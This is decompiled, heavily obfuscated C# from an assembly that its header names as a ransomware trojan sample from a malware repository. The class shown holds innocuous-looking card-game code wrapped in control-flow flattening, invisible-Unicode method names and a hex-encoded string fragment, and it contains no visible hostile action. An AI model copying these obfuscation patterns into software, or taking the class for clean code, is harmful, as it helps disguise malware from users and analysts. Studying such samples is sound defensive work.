// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: WaitHand, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: A25291C7-A109-4713-B14B-FDD04827C77F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-c95b09c6ffd61a284edc93ed78ccae28eae9cbf5eb73943fd588e31dfe8b57dc.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = 2025706504;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2123688565)) % 11U)
        {
          case 0:
            int num3;
            num1 = num3 = BaseStream == 1 ? 115612110 : (num3 = 372244353);
            continue;
          case 1:
            num1 = (int) num2 * -1611739922 ^ -772066406;
            continue;
          case 2:
            str2 = str1;
            num1 = 1149262293;
            continue;
          case 3:
            str1 = "7874327938";
            num1 = (int) num2 * 2089678327 ^ -1856451474;
            continue;
          case 4:
            goto label_1;
          case 5:
            num1 = (int) num2 * 1358275731 ^ 1042107215;
            continue;
          case 6:
            str1 = (string) null;
            int num4 = BaseStream != 0 ? 2065261876 : (num4 = 1909825255);
            num1 = num4 ^ (int) num2 * -1676942425;
            continue;
          case 8:
            str1 = "4F7065726174696E6753797374";
            num1 = (int) num2 * 655922723 ^ 1412323661;
            continue;
          case 9:
            num1 = (int) num2 * 1130607140 ^ -2022752723;
            continue;
          case 10:
            num1 = (int) num2 * -738428745 ^ -1104145797;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = 1444475693;
label_2:
      uint num2;
      int num3;
      int num4;
      switch ((num2 = (uint) (num1 ^ 772935856)) % 3U)
      {
        case 1:
          num4 = 0;
          goto label_5;
        case 2:
          goto label_1;
        default:
          return num3;
      }
label_4:
      num4 = this.PlanningCards[cardTypeIndex];
label_5:
      num3 = num4;
      num1 = 776856614;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
label_1:
        int num2 = -1111563736;
        int index;
        bool flag;
        int[] planningCards;
        int planningCardsCount;
        while (true)
        {
          uint num3;
          switch ((num3 = (uint) (num2 ^ -2133871850)) % 12U)
          {
            case 0:
              goto label_1;
            case 1:
              flag = planningCards[index] > 0;
              num2 = -1364569112;
              continue;
            case 2:
              planningCards = this.PlanningCards;
              num2 = (int) num3 * 691325912 ^ -135277482;
              continue;
            case 3:
              num2 = (int) num3 * -1230258727 ^ -1952505214;
              continue;
            case 4:
              index = 0;
              num2 = (int) num3 * 1421640717 ^ 1170939425;
              continue;
            case 5:
              planningCardsCount = num1;
              num2 = (int) num3 * 700694577 ^ 153947596;
              continue;
            case 6:
              num2 = -2054070754;
              continue;
            case 7:
              int num4;
              num2 = num4 = index >= planningCards.Length ? -1096610245 : (num4 = -1704872073);
              continue;
            case 8:
              ++index;
              num2 = (int) num3 * -2134692031 ^ -1972673287;
              continue;
            case 9:
              ++num1;
              num2 = (int) num3 * 1228489174 ^ -953550314;
              continue;
            case 10:
              int num5 = flag ? 718366201 : (num5 = 350184150);
              num2 = num5 ^ (int) num3 * 685282301;
              continue;
            default:
              goto label_13;
          }
        }
label_13:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = -893365929;
      string str1;
      int index;
      int planningCard;
      string str2;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1050204924)) % 14U)
        {
          case 0:
            int num3 = flag ? -589479966 : (num3 = -1901654205);
            num1 = num3 ^ (int) num2 * 380105680;
            continue;
          case 1:
            str1 = Player.\u202E​‎‭‏‭‮‏‍‭⁪⁫‍⁫‎⁯‫⁭‬‌‮⁪⁫‍‎⁫‫⁫‮‪‪‍‍‫‍‍⁬‪​‏‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -1626133031;
            continue;
          case 2:
            num1 = (int) num2 * 1694299664 ^ -1278663544;
            continue;
          case 3:
            str1 = " ";
            num1 = (int) num2 * 1418907429 ^ 1919177301;
            continue;
          case 4:
            int num4;
            num1 = num4 = index < this.PlanningCards.Length ? -1394821238 : (num4 = -71412335);
            continue;
          case 5:
            ++index;
            num1 = -250735384;
            continue;
          case 7:
            flag = planningCard == 0;
            num1 = (int) num2 * -125010886 ^ 1274954550;
            continue;
          case 8:
            num1 = (int) num2 * 649753028 ^ -1430412095;
            continue;
          case 9:
            num1 = (int) num2 * -1070215455 ^ -719062341;
            continue;
          case 10:
            index = 0;
            num1 = (int) num2 * 134435650 ^ 2132043550;
            continue;
          case 11:
            str2 = str1;
            num1 = (int) num2 * 494725076 ^ -428074851;
            continue;
          case 12:
            planningCard = this.PlanningCards[index];
            num1 = -1087801613;
            continue;
          case 13:
            goto label_1;
          default:
            goto label_15;
        }
      }
label_15:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
      Player player = new Player()
      {
        Name = json["name"].Value,
        PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
        UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
      };
label_1:
      int num1 = 1967683494;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1860545588)) % 3U)
        {
          case 1:
            num1 = (int) num2 * -1627894748 ^ 44315541;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
      int count = json.Count;
label_1:
      int num1 = -1759946492;
      int[] numArray;
      int[] planningCards;
      int aIndex;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2098801602)) % 9U)
        {
          case 0:
            aIndex = 0;
            num1 = (int) num2 * 324362232 ^ 1110407198;
            continue;
          case 1:
            int num3 = flag ? 849216968 : (num3 = 2110294141);
            num1 = num3 ^ (int) num2 * 703022850;
            continue;
          case 2:
            goto label_1;
          case 3:
            flag = aIndex < count;
            num1 = -180820015;
            continue;
          case 4:
            num1 = (int) num2 * -1509509417 ^ -1061498353;
            continue;
          case 5:
            planningCards = numArray;
            num1 = (int) num2 * 1539694747 ^ -168627459;
            continue;
          case 7:
            numArray = new int[count];
            num1 = (int) num2 * -1444276482 ^ -1964578467;
            continue;
          case 8:
            numArray[aIndex] = json[aIndex].AsInt;
            ++aIndex;
            num1 = -1050406762;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return planningCards;
    }

    public override string ToString() => Player.\u206F⁪‍‏​‪‌⁬⁪‎⁫⁫‌⁭⁪⁮‭‪‮​⁪⁮⁫⁬⁯‬‌​‍⁪⁫​⁫‭‎‭⁮‌‫⁪‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);

    static string \u202E​‎‭‏‭‮‏‍‭⁪⁫‍⁫‎⁯‫⁭‬‌‮⁪⁫‍‎⁫‫⁫‮‪‪‍‍‫‍‍⁬‪​‏‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206F⁪‍‏​‪‌⁬⁪‎⁫⁫‌⁭⁪⁮‭‪‮​⁪⁮⁫⁬⁯‬‌​‍⁪⁫​⁫‭‎‭⁮‌‫⁪‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
